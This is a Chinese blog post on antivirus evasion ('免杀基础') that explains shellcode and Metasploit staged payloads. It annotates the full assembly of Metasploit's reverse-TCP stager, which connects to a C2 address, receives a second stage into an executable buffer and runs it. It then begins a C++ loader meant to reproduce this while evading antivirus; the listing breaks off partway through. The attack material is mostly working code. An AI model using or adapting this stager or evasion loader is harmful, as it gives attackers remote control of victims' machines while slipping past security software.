

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Simply">
  <meta name="keywords" content="">
  
    <meta name="description" content="Shellcode1、shellcode是什么shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机器码，让电脑可以执行攻击者的任意指令。 说白了，就是一段16进制字符串，可以直接运行在内存中 2、shellcod">
<meta property="og:type" content="article">
<meta property="og:title" content="免杀基础">
<meta property="og:url" content="http://example.com/2024/05/20/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80/index.html">
<meta property="og:site_name" content="manic的小站">
<meta property="og:description" content="Shellcode1、shellcode是什么shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机器码，让电脑可以执行攻击者的任意指令。 说白了，就是一段16进制字符串，可以直接运行在内存中 2、shellcod">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/%E5%B0%81%E9%9D%A2.png">
<meta property="article:published_time" content="2024-05-20T08:07:30.000Z">
<meta property="article:modified_time" content="2024-05-20T08:21:35.735Z">
<meta property="article:author" content="manic">
<meta property="article:tag" content="shellcode">
<meta property="article:tag" content="加载器">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/img/%E5%B0%81%E9%9D%A2.png">
  
  
  
  <title>免杀基础 - manic的小站</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/fluid-extension.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"GI2ZD3OR5b6C0PJDuqoKtFPs-gzGzoHsz","app_key":"A3XJlxUOakFURqQeV3D3B29x","server_url":"https://gi2zd3or.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>manic&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="免杀基础"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-05-20 16:07" pubdate>
          2024年5月20日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          15k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          124 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">免杀基础</h1>
            
            
              <div class="markdown-body">
                
                <h3 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h3><h4 id="1、shellcode是什么"><a href="#1、shellcode是什么" class="headerlink" title="1、shellcode是什么"></a>1、shellcode是什么</h4><p>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode<strong>机器码</strong>，让电脑可以执行攻击者的任意指令。</p>
<p>说白了，就是一段16进制字符串，可以直接运行在内存中</p>
<h4 id="2、shellcode分类"><a href="#2、shellcode分类" class="headerlink" title="2、shellcode分类"></a>2、shellcode分类</h4><h6 id="stage和stageless"><a href="#stage和stageless" class="headerlink" title="stage和stageless"></a>stage和stageless</h6><p>Stage&amp;Stageless. 所谓的<strong>stage</strong>(有阶段)，指的是Beacon会分段的加载shellcode(具体表现为，通过不断的向Listener发起请求，最终获取一个完整的shellcode并执行)，<strong>stageless</strong>(无阶段)，则是在生成时包含完整的shellcode。</p>
<p>说白了，webshell里的小马和大马</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">windows<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp stage<br>windows<span class="hljs-regexp">/x64/m</span>eterpreter_reverse_tcp stageless<br></code></pre></td></tr></table></figure>

<h4 id="3、stage-有阶段-shellcode分析"><a href="#3、stage-有阶段-shellcode分析" class="headerlink" title="3、stage(有阶段)shellcode分析"></a>3、<strong>stage</strong>(有阶段)shellcode分析</h4><p>msf的shellcode源码：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/stager/stager_reverse_tcp_nx.asm">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/stager/stager_reverse_tcp_nx.asm</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">[BITS 32]<br>[ORG 0]<br><br>  cld                    ; Clear the direction flag. 用于将处理器的方向标志位清零，确保字符串操作的方向是向上增长。<br>  call start             ; Call start, this pushes the address of &#x27;api_call&#x27; onto the stack. 这是一个函数调用，它调用了一个名为start的标签处的代码。<br>%include &quot;./src/block/block_api.asm&quot; 这条指令包含了一个外部文件的内容，这个文件包含了API调用相关的代码。<br>start:                   ;<br>  pop ebp                ; pop off the address of &#x27;api_call&#x27; for calling later. 这里使用pop指令将栈顶的数值弹出并存入寄存器ebp中。<br>%include &quot;./src/block/block_reverse_tcp.asm&quot; <br>  ; By here we will have performed the reverse_tcp connection and EDI will be our socket. 这个指令又包含了另一个外部文件的内容，可能是与反向TCP shell相关的代码。<br>%include &quot;./src/block/block_recv.asm&quot;<br>  ; By now we will have recieved in the second stage into a RWX buffer and be executing it. 这个指令包含了接收数据的代码。<br></code></pre></td></tr></table></figure>

<h6 id="block-api-asm"><a href="#block-api-asm" class="headerlink" title="block_api.asm"></a>block_api.asm</h6><p>代码中包含了三个文件，先来分析第一个 .&#x2F;src&#x2F;block&#x2F;block_api.asm 文件</p>
<p><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs assembly">api_call:<br>  pushad                     ; We preserve all the registers for the caller, bar EAX and ECX.<br>  mov ebp, esp               ; Create a new stack frame<br>  xor edx, edx               ; Zero EDX<br>  mov edx, [fs:edx+0x30]     ; Get a pointer to the PEB<br>  mov edx, [edx+0xc]         ; Get PEB-&gt;Ldr<br>  mov edx, [edx+0x14]        ; Get the first module from the InMemoryOrder module list<br>next_mod:                    ;<br>  mov esi, [edx+0x28]        ; Get pointer to modules name (unicode string)<br>  movzx ecx, word [edx+0x26] ; Set ECX to the length we want to check<br>  xor edi, edi               ; Clear EDI which will store the hash of the module name<br>loop_modname:                ;<br>  xor eax, eax               ; Clear EAX<br>  lodsb                      ; Read in the next byte of the name<br>  cmp al, &#x27;a&#x27;                ; Some versions of Windows use lower case module names<br>  jl not_lowercase           ;<br>  sub al, 0x20               ; If so normalise to uppercase<br>not_lowercase:               ;<br>  ror edi, 0xd               ; Rotate right our hash value<br>  add edi, eax               ; Add the next byte of the name<br>  dec ecx<br>  jnz loop_modname           ; Loop until we have read enough<br>  ; We now have the module hash computed<br>  push edx                   ; Save the current position in the module list for later<br>  push edi                   ; Save the current module hash for later<br>  ; Proceed to iterate the export address table,<br>  mov edx, [edx+0x10]        ; Get this modules base address<br>  mov eax, [edx+0x3c]        ; Get PE header<br>  add eax, edx               ; Add the modules base address<br>  mov eax, [eax+0x78]        ; Get export tables RVA<br>  test eax, eax              ; Test if no export address table is present<br>  jz get_next_mod1           ; If no EAT present, process the next module<br>  add eax, edx               ; Add the modules base address<br>  push eax                   ; Save the current modules EAT<br>  mov ecx, [eax+0x18]        ; Get the number of function names<br>  mov ebx, [eax+0x20]        ; Get the rva of the function names<br>  add ebx, edx               ; Add the modules base address<br>  ; Computing the module hash + function hash<br>get_next_func:               ;<br>  test ecx, ecx              ; Changed from jecxz to accomodate the larger offset produced by random jmps below<br>  jz get_next_mod            ; When we reach the start of the EAT (we search backwards), process the next module<br>  dec ecx                    ; Decrement the function name counter<br>  mov esi, [ebx+ecx*4]       ; Get rva of next module name<br>  add esi, edx               ; Add the modules base address<br>  xor edi, edi               ; Clear EDI which will store the hash of the function name<br>  ; And compare it to the one we want<br>loop_funcname:               ;<br>  xor eax, eax               ; Clear EAX<br>  lodsb                      ; Read in the next byte of the ASCII function name<br>  ror edi, 0xd               ; Rotate right our hash value<br>  add edi, eax               ; Add the next byte of the name<br>  cmp al, ah                 ; Compare AL (the next byte from the name) to AH (null)<br>  jne loop_funcname          ; If we have not reached the null terminator, continue<br>  add edi, [ebp-8]           ; Add the current module hash to the function hash<br>  cmp edi, [ebp+0x24]        ; Compare the hash to the one we are searchnig for<br>  jnz get_next_func          ; Go compute the next function hash if we have not found it<br>  ; If found, fix up stack, call the function and then value else compute the next one...<br>  pop eax                    ; Restore the current modules EAT<br>  mov ebx, [eax+0x24]        ; Get the ordinal table rva<br>  add ebx, edx               ; Add the modules base address<br>  mov cx, [ebx+2*ecx]        ; Get the desired functions ordinal<br>  mov ebx, [eax+0x1c]        ; Get the function addresses table rva<br>  add ebx, edx               ; Add the modules base address<br>  mov eax, [ebx+4*ecx]       ; Get the desired functions RVA<br>  add eax, edx               ; Add the modules base address to get the functions actual VA<br>  ; We now fix up the stack and perform the call to the desired function...<br>finish:<br>  mov [esp+0x24], eax        ; Overwrite the old EAX value with the desired api address for the upcoming popad<br>  pop ebx                    ; Clear off the current modules hash<br>  pop ebx                    ; Clear off the current position in the module list<br>  popad                      ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered<br>  pop ecx                    ; Pop off the origional return address our caller will have pushed<br>  pop edx                    ; Pop off the hash value our caller will have pushed<br>  push ecx                   ; Push back the correct return value<br>  jmp eax                    ; Jump into the required function<br>  ; We now automagically return to the correct caller...<br>get_next_mod:                ;<br>  pop eax                    ; Pop off the current (now the previous) modules EAT<br>get_next_mod1:               ;<br>  pop edi                    ; Pop off the current (now the previous) modules hash<br>  pop edx                    ; Restore our position in the module list<br>  mov edx, [edx]             ; Get the next module<br>  jmp next_mod               ; Process this module<br></code></pre></td></tr></table></figure>

<p>主要功能是通过计算的hash值来找到对应 dll 和函数的地址，大概流程如下：</p>
<ol>
<li>程序首先通过哈希值比较的方式，在已加载的模块列表中搜索匹配的函数名。它使用一个循环来遍历模块列表，并将函数名与哈希值进行比较，直到找到匹配的函数或遍历完所有模块。</li>
<li>如果找到了匹配的函数，程序会恢复栈上的数据，并获取目标函数的地址。</li>
<li>接下来，程序会修正栈上的数据，以便调用目标函数，并跳转到该函数的地址，实现函数调用。</li>
<li>如果没有找到匹配的函数，或者已经遍历完所有模块，则程序会继续处理下一个模块，直到找到匹配的函数或遍历完所有模块为止。</li>
</ol>
<h6 id="block-reverse-tcp-asm"><a href="#block-reverse-tcp-asm" class="headerlink" title="block_reverse_tcp.asm"></a>block_reverse_tcp.asm</h6><p>第二个文件是 .&#x2F;src&#x2F;block&#x2F;block_reverse_tcp.asm 文件</p>
<p><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_tcp.asm">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_tcp.asm</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs assembly">reverse_tcp:<br>  push 0x00003233        ; Push the bytes &#x27;ws2_32&#x27;,0,0 onto the stack.<br>  push 0x5F327377        ; ...<br>  push esp               ; Push a pointer to the &quot;ws2_32&quot; string on the stack.<br>  push 0x0726774C        ; hash( &quot;kernel32.dll&quot;, &quot;LoadLibraryA&quot; )<br>  call ebp               ; LoadLibraryA( &quot;ws2_32&quot; )<br>  <br>  mov eax, 0x0190        ; EAX = sizeof( struct WSAData )<br>  sub esp, eax           ; alloc some space for the WSAData structure<br>  push esp               ; push a pointer to this stuct<br>  push eax               ; push the wVersionRequested parameter<br>  push 0x006B8029        ; hash( &quot;ws2_32.dll&quot;, &quot;WSAStartup&quot; )<br>  call ebp               ; WSAStartup( 0x0190, &amp;WSAData );<br>  <br>  push eax               ; if we succeed, eax wil be zero, push zero for the flags param.<br>  push eax               ; push null for reserved parameter<br>  push eax               ; we do not specify a WSAPROTOCOL_INFO structure<br>  push eax               ; we do not specify a protocol<br>  inc eax                ;<br>  push eax               ; push SOCK_STREAM<br>  inc eax                ;<br>  push eax               ; push AF_INET<br>  push 0xE0DF0FEA        ; hash( &quot;ws2_32.dll&quot;, &quot;WSASocketA&quot; )<br>  call ebp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );<br>  xchg edi, eax          ; save the socket for later, don&#x27;t care about the value of eax after this<br><br>set_address:<br>  push byte 0x05         ; retry counter<br>  push 0x0100007F        ; host 127.0.0.1<br>  push 0x5C110002        ; family AF_INET and port 4444<br>  mov esi, esp           ; save pointer to sockaddr struct<br>  <br>try_connect:<br>  push byte 16           ; length of the sockaddr struct<br>  push esi               ; pointer to the sockaddr struct<br>  push edi               ; the socket<br>  push 0x6174A599        ; hash( &quot;ws2_32.dll&quot;, &quot;connect&quot; )<br>  call ebp               ; connect( s, &amp;sockaddr, 16 );<br><br>  test eax,eax           ; non-zero means a failure<br>  jz short connected<br><br>handle_failure:<br>  dec dword [esi+8]<br>  jnz short try_connect<br><br>failure:<br>  push 0x56A2B5F0        ; hardcoded to exitprocess for size<br>  call ebp<br><br>connected:<br></code></pre></td></tr></table></figure>

<p>这个文件是发起socket连接的，请求连接写好的c2的地址和端口，大概流程是</p>
<ol>
<li>加载 ws2_32.dll 库；</li>
<li>调用 WSAStartup() 初始化 Winsock；</li>
<li>调用 WSASocketA() 创建一个套接字；</li>
<li>指定要连接的目标地址和端口号；</li>
<li>调用 connect() 尝试连接指定的目标；</li>
<li>如果连接失败，则重试指定次数（这里是 5 次）；</li>
<li>如果连接成功，则将控制权交给远程主机。</li>
</ol>
<h6 id="block-recv-asm"><a href="#block-recv-asm" class="headerlink" title="block_recv.asm"></a>block_recv.asm</h6><p>第三个文件是 .&#x2F;src&#x2F;block&#x2F;block_recv.asm 文件</p>
<p><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_recv.sm">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_recv.sm</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs assembly">[BITS 32]<br><br>; Compatible: block_bind_tcp, block_reverse_tcp, block_reverse_ipv6_tcp<br><br>; Input: EBP must be the address of &#x27;api_call&#x27;. EDI must be the socket. ESI is a pointer on stack.<br>; Output: None.<br>; Clobbers: EAX, EBX, ESI, (ESP will also be modified)<br><br>recv:<br>  ; Receive the size of the incoming second stage...<br>  push byte 0            ; flags<br>  push byte 4            ; length = sizeof( DWORD );<br>  push esi               ; the 4 byte buffer on the stack to hold the second stage length<br>  push edi               ; the saved socket<br>  push 0x5FC8D902        ; hash( &quot;ws2_32.dll&quot;, &quot;recv&quot; )<br>  call ebp               ; recv( s, &amp;dwLength, 4, 0 );<br>  ; Alloc a RWX buffer for the second stage<br>  mov esi, [esi]         ; dereference the pointer to the second stage length<br>  push byte 0x40         ; PAGE_EXECUTE_READWRITE<br>  push 0x1000            ; MEM_COMMIT<br>  push esi               ; push the newly recieved second stage length.<br>  push byte 0            ; NULL as we dont care where the allocation is.<br>  push 0xE553A458        ; hash( &quot;kernel32.dll&quot;, &quot;VirtualAlloc&quot; )<br>  call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );<br>  ; Receive the second stage and execute it...<br>  xchg ebx, eax          ; ebx = our new memory address for the new stage<br>  push ebx               ; push the address of the new stage so we can return into it<br>read_more:               ;<br>  push byte 0            ; flags<br>  push esi               ; length<br>  push ebx               ; the current address into our second stage&#x27;s RWX buffer<br>  push edi               ; the saved socket<br>  push 0x5FC8D902        ; hash( &quot;ws2_32.dll&quot;, &quot;recv&quot; )<br>  call ebp               ; recv( s, buffer, length, 0 );<br>  add ebx, eax           ; buffer += bytes_received<br>  sub esi, eax           ; length -= bytes_received, will set flags<br>  jnz read_more          ; continue if we have more to read<br>  ret                    ; return into the second stage<br></code></pre></td></tr></table></figure>

<p>这个文件是处理接收到的内容的，运行 recv 接收一个4字节，然后把这个4字节内容作为长度，使用virtualAlloc开辟对应长度的空间，循环读接下来发送过来的内容并存到刚刚开辟的空间里面，最后直接ret 将之前开辟空间的地址放到eip，运行传输过来的内容用于第二阶段的持续控制。 </p>
<ol>
<li>接收第二阶段的大小</li>
<li>为第二阶段分配一个RWX（可读可写可执行）的缓冲区</li>
<li>接收第二阶段的代码到缓冲区</li>
<li>最后，使用ret指令从函数中返回，并跳转到第二阶段的地址，开始执行第二阶段的代码。</li>
</ol>
<h6 id="c-实现shellcode连接"><a href="#c-实现shellcode连接" class="headerlink" title="c++实现shellcode连接"></a>c++实现shellcode连接</h6><p>接下来使用c++实现上述的功能，替代shellcode，直接利用socket与msf建立连接，实现免杀</p>
<p>主要步骤：</p>
<ol>
<li>找到ws2_32.dll库</li>
<li>初始化socket对象</li>
<li>开始建立链接</li>
<li>申请需要的内存空间</li>
<li>循环接受msf传递的payload到内存空间中</li>
<li>使用汇编指令jmp将内存空间中的payload转换成可执行的代码</li>
</ol>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;WinSock2.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> <span class="hljs-keyword">warning</span> (disable: 4996)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib,<span class="hljs-string">&quot;WS2_32.lib&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-built_in">ShowWindow</span>(<span class="hljs-built_in">GetForegroundWindow</span>(), <span class="hljs-number">0</span>); <span class="hljs-comment">//将当前活动窗口隐藏</span><br>	<span class="hljs-comment">//分配socket资源</span><br>	WSADATA wsdata;<br>	<span class="hljs-keyword">if</span> (<span class="hljs-built_in">WSAStartup</span>(<span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), 